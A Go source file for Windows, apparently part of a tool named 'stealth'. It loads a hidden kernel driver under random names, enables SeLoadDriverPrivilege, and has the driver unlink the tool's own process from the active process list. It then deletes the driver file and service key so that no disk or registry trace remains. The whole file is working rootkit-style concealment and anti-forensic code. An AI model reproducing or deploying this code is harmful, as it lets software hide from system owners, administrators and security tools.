//go:build windows

package stealth

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// 与 tools/win-hide/v2hide.c 约定的 IOCTL
const (
	ioctlV2HideAdd    = 0x00222004 // CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
	ioctlV2HideDel    = 0x00222008 // 0x802
	ioctlV2HideStatus = 0x0022200C // 0x803
)

var (
	loadedService string
	loadedDevice  string
	driverHandle  windows.Handle
)

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

// kernelHide 安装并加载 v2hide.sys，把当前 pid 交给内核侧从活动进程链摘除。
//
// 流程：复制驱动 -> 建服务键 -> 提权 SeLoadDriverPrivilege -> NtLoadDriver
//
//	-> 打开设备下发 pid -> 删除服务键与驱动文件（驱动保持驻留，磁盘/注册表不留痕）
func kernelHide(c Config) error {
	src := c.KernelDriver
	if src == "" {
		return fmt.Errorf("未配置 KernelDriver 路径")
	}
	if _, err := os.Stat(src); err != nil {
		return fmt.Errorf("驱动不存在 %s: %w", src, err)
	}

	svc := "s" + randHex(8)
	dev := "v2h" + randHex(8)
	dst := filepath.Join(os.Getenv("SystemRoot"), "System32", "drivers", svc+".sys")
	if err := copyFile(src, dst); err != nil {
		return err
	}

	svcPath := "SYSTEM\\CurrentControlSet\\Services\\" + svc
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, svcPath, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("创建服务键: %w", err)
	}
	if err = k.SetStringValue("ImagePath", "\\??\\"+dst); err == nil {
		err = k.SetDWordValue("Type", 1)
	}
	if err == nil {
		err = k.SetDWordValue("Start", 3)
	}
	if err == nil {
		err = k.SetDWordValue("ErrorControl", 1)
	}
	if err == nil {
		pk, _, e := registry.CreateKey(k, "Parameters", registry.ALL_ACCESS)
		if e != nil {
			err = e
		} else {
			_ = pk.SetStringValue("DevName", dev)
			_ = pk.SetDWordValue("HidePid", uint32(os.Getpid()))
			_ = pk.SetDWordValue("HideDriver", 1)
			pk.Close()
		}
	}
	k.Close()
	if err != nil {
		deleteServiceKey(svc)
		_ = os.Remove(dst)
		return fmt.Errorf("写服务键: %w", err)
	}

	if err := enablePrivilege("SeLoadDriverPrivilege"); err != nil {
		deleteServiceKey(svc)
		_ = os.Remove(dst)
		return fmt.Errorf("提权 SeLoadDriverPrivilege: %w", err)
	}
	regPath := "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + svc
	if err := ntLoadDriver(regPath); err != nil {
		deleteServiceKey(svc)
		_ = os.Remove(dst)
		return fmt.Errorf("NtLoadDriver: %w", err)
	}
	loadedService, loadedDevice = svc, dev

	for i := 0; i < 50; i++ {
		if err := openDevice(dev); err == nil {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if driverHandle != 0 {
		_ = ioctl(ioctlV2HideAdd, uint32(os.Getpid()))
	}
	deleteServiceKey(svc)
	_ = os.Remove(dst)
	return nil
}

func kernelUnhide() error {
	if driverHandle != 0 {
		_ = ioctl(ioctlV2HideDel, uint32(os.Getpid()))
		_ = windows.CloseHandle(driverHandle)
		driverHandle = 0
	}
	if loadedService == "" {
		return nil
	}
	regPath := "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + loadedService
	err := ntUnloadDriver(regPath)
	loadedService, loadedDevice = "", ""
	return err
}

func kernelAddPID(pid int) error {
	if driverHandle == 0 {
		return fmt.Errorf("驱动未加载")
	}
	return ioctl(ioctlV2HideAdd, uint32(pid))
}

func openDevice(name string) error {
	p, err := windows.UTF16PtrFromString("\\\\.\\" + name)
	if err != nil {
		return err
	}
	h, err := windows.CreateFile(p, windows.GENERIC_READ|windows.GENERIC_WRITE, 0, nil,
		windows.OPEN_EXISTING, 0, 0)
	if err != nil {
		return err
	}
	driverHandle = h
	return nil
}

func ioctl(code uint32, pid uint32) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, pid)
	var ret uint32
	return windows.DeviceIoControl(driverHandle, code,
		&buf[0], uint32(len(buf)), &buf[0], uint32(len(buf)), &ret, nil)
}

func ntLoadDriver(registryPath string) error {
	return callNtDriver("NtLoadDriver", registryPath)
}

func ntUnloadDriver(registryPath string) error {
	return callNtDriver("NtUnloadDriver", registryPath)
}

func callNtDriver(procName, registryPath string) error {
	buf, err := windows.UTF16FromString(registryPath)
	if err != nil {
		return err
	}
	us := unicodeString{
		Length:        uint16((len(buf) - 1) * 2),
		MaximumLength: uint16(len(buf) * 2),
		Buffer:        &buf[0],
	}
	r, _, e := ntdll.NewProc(procName).Call(uintptr(unsafe.Pointer(&us)))
	if r != 0 {
		return fmt.Errorf("%s=0x%x %v", procName, r, e)
	}
	return nil
}

func enablePrivilege(name string) error {
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &tok); err != nil {
		return err
	}
	defer tok.Close()

	namePtr, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	var luid windows.LUID
	advapi := windows.NewLazySystemDLL("advapi32.dll")
	r, _, e := advapi.NewProc("LookupPrivilegeValueW").Call(0,
		uintptr(unsafe.Pointer(namePtr)), uintptr(unsafe.Pointer(&luid)))
	if r == 0 {
		return fmt.Errorf("LookupPrivilegeValueW: %v", e)
	}
	tp := windows.Tokenprivileges{PrivilegeCount: 1}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	if err := windows.AdjustTokenPrivileges(tok, false, &tp, 0, nil, nil); err != nil {
		return err
	}
	return nil
}

func deleteServiceKey(svc string) {
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		"SYSTEM\\CurrentControlSet\\Services\\"+svc, registry.ALL_ACCESS); err == nil {
		k.Close()
	}
	_ = registry.DeleteKey(registry.LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"+svc)
}

func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func copyFile(src, dst string) error {
	in, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, in, 0644)
}
